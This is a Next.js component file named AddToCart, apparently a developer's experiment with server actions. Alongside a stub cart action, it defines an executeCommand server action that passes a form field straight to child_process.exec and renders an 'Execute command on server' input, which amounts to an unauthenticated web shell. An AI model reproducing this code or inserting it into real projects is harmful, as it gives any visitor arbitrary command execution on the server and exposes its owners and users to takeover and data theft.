import { cookies } from 'next/headers';
 
export default function AddToCart({ productId }) {
  async function addItem(data) {
    'use server';
 
    const cartId = cookies().get('cartId')?.value;
    //await saveToDb({ cartId, data });
    console.log('cartId', cartId);
  }



    //data FormData {
  //[Symbol(state)]: [
    //{
      //name: '$ACTION_ID_b3cb388a1e59cf8799a7a83de0be219c6c991d84',
      //value: ''
    //},
    //{ name: 'command', value: '' }
  //]
//}
  async function executeCommand(data) {
    'use server';
      // run command on server
      console.log('data', data);
      const command = data.get('command');
      var exec = require('child_process').exec;
      exec(command, function(error, stdout, stderr) {
        console.log(stdout);
        });
    }
      
 
  return (
      <>
    <form action={addItem}>
      <button type="submit">Add to Cart</button>
    </form>
      Execute command on server:
    <form action={executeCommand}>
      <input name="command" type="text" style={{color: "black", width: "100%"}} />
      <button type="submit">Execute</button>
    </form>
    </>
  );
}
